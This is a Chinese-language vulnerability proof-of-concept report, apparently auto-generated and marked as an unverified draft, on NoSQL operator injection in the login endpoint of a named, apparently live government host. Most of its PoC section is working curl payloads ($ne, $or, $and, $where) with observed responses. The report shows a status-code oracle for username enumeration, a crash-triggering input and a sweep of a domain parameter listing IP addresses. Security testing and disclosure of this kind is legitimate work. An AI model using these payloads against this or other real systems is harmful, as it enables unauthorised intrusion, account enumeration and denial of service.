# POC/EXP — /login 接口存在 MongoDB NoSQL 注入（用户名/密码字段未过滤，状态码 oracle 泄露 source 校验，单/零文档触发 500 崩溃）

> 漏洞ID: `ee28b5a7-94ed-418c-8af9-fc87d2c242a4`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4004/login`

**類型**: NoSQL 注入

## 描述

**漏洞类型**: MongoDB NoSQL 注入（认证端点，未过滤 `$` 操作符）\n\n**触发点**: `POST /login` 的 `username` / `password` 字段。后端将 JSON 请求体中的 username/password 直接拼入 MongoDB `find({username: X, password: Y})` 查询，未对 `$` 开头的操作符对象做类型校验/转义，导致查询操作符注入（Query Operator Injection）。\n\n**核心行为（已验证）**: 后端登录逻辑为「多文档匹配 → source 白名单校验（在密码校验之前）→ result[0] 处理」。具体：\n1. 用 `{"$ne":null}` 匹配**多个**用户文档 → 进入 source 校验路径 → 返回 403「無法登入的來源」（匹配到的用户 source 字段均不在服务端硬编码白名单，且 source 校验基于用户文档而非请求参数，domain/Origin/Referer 均被忽略）。\n2. 用**精确字符串**或 `$eq`/`$regex`/`$in`/`$where` 等匹配到 **0 或 1 个**文档 → 代码在处理 `result[0]` 时抛出未捕获的 `TypeError` → 返回 HTTP 500（body 仅 "TypeError"，无栈信息）。\n3. `$and` 嵌套 source 过滤把结果缩小到 ≤1 文档 → 同样 500。\n\n**状态码 Oracle**: 攻击者可仅凭响应码（403=多文档/source校验路径 vs 500=单/零文档崩溃）推断用户名存在性与文档分布，且泄露了「source 白名单校验先于密码校验」的认证流程细节。\n\n**认证绕过现状**: NoSQL 注入可到达 source 校验，但因所有可匹配用户的 source 均不在白名单（白名单为服务端硬编码、无法从请求控制），当前**未实现完整认证绕过**，但已突破密码校验前的 source 关卡并造成信息泄露+DoS。

## 前置條件

无需认证（未授权可达）；需先 GET /captcha 获取 connect.sid session cookie；Content-Type 为 application/json 或 application/x-www-form-urlencoded 均可触发。

## POC / 復現步驟

```
**PoC 1 — NoSQL 注入触发 403（source 校验路径，多文档）**:
```
curl -k -c /tmp/cj -X GET 'https://epcr.tpf.gov.tw:4004/captcha' -A 'Mozilla/5.0'
curl -k -b /tmp/cj -X POST 'https://epcr.tpf.gov.tw:4004/login' \
  -H 'Content-Type: application/json' -A 'Mozilla/5.0' \
  -d '{"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}'
# -> HTTP/2 403
#    {"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}
```

**PoC 2 — NoSQL 注入触发 500 崩溃（单/零文档）**:
```
curl -k -c /tmp/cj -X GET 'https://epcr.tpf.gov.tw:4004/captcha' -A 'Mozilla/5.0'
curl -k -b /tmp/cj -X POST 'https://epcr.tpf.gov.tw:4004/login' \
  -H 'Content-Type: application/json' -A 'Mozilla/5.0' \
  -d '{"username":"admin","password":"x","captcha":"1","domain":"AUTH_SERVER"}'
# -> HTTP/2 500  body: "TypeError"  (Content-Length 9)
```

**PoC 3 — 操作符对比矩阵（同一 $ne password 下）**:
| username payload | 文档数 | 状态码 | 含义 |
|---|---|---|---|
| `{"$ne":null}` | 多 | 403 | source 校验路径 |
| `"admin"` / `"tpf"` / `"operator"` / `"dispatch"` 等 15 个 | ≤1 | 500 | result[0] 崩溃 |
| `{"$eq":"ZzzZ"}` | 0 | 500 | 零文档崩溃 |
| `{"$or":[{"username":"admin"},{"username":"x"}]}` | 多 | 403 | source 路径 |
| `{"$and":[{"username":{"$ne":null}},{"source":{"$eq":"PORTAL"}}]}` | ≤1 | 500 | source 过滤后单/零文档 |
| `{"$where":"function(){return true}"}` | 多 | 500 | $where 崩溃 |

**PoC 4 — form-urlencoded 同样注入**:
```
curl -k -b /tmp/cj -X POST 'https://epcr.tpf.gov.tw:4004/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' -A 'Mozilla/5.0' \
  --data 'username=&password=&captcha=1&domain=AUTH_SERVER'
# -> HTTP/2 500  body: "TypeError"
```

**domain 参数被忽略（28 值全相同）**:
```
for d in AUTH_SERVER PORTAL WEB TPF localhost epcr.tpf.gov.tw 118.163.107.93 35.234.50.28 ...:
  POST /login {"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"$d"}
# -> 全部 HTTP/2 403 {"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}  (仅 1 种响应)
```

**后端普遍接受 Mongo 操作符（前端 JS 证据）**: `js/services.js` 中 `getDispatchRecords` 使用 `$httpParamSerializerJQLike` 序列化 `params: {dispatchedAT:{$gte:dateBegin}, StatusId:{$notIn:[9,11,12]}}` 调用 `GET /DispatchRecords`，证实整个后端采用 JQLike/Mongo 操作符查询模式，NoSQL 注入面不止 /login。
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
